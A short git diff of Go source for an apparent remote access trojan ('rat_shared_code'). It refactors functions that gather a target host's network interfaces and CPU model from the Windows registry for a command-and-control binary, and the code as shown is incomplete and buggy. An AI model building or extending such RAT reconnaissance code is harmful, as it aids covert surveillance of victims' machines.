@@ -7,7 +7,7 @@ This file contains the code for gathering host intelligence
 
 /*/
 
-package rat_shared_code
+package Rat_shared_code
 
 // import the libraries we need
 import (
@@ -34,15 +34,17 @@ That calls the others depending on the request from the
 Command and Control binary
 */
 func gather_intel(intel_struct HostIntel) (HostIntel, error) {
-	// Get all network interfaces
-	interfaces, _ := net.Interfaces()
-	HostIntel.interfaces = interfaces
-	return _, nil
 
 }
+func get_interfaces(intel_struct HostIntel) {
+	// Get all network interfaces
+	iface, _ := net.Interfaces()
+	HostIntel.Interfaces = iface
+}
 
-// GetCPUmodel returns the target system's CPU model
-func GetCPUmodel() (string, error) {
+// GetCPUmodel inserts information about the target system's CPU model
+// into a hostintel struct
+func GetCPUmodel(intel_struct HostIntel) {
 	key := `HARDWARE\DESCRIPTION\System\CentralProcessor\0`
 	regValue := "Identifier"
 	k, err := registry.OpenKey(registry.LOCAL_MACHINE, key, registry.QUERY_VALUE)
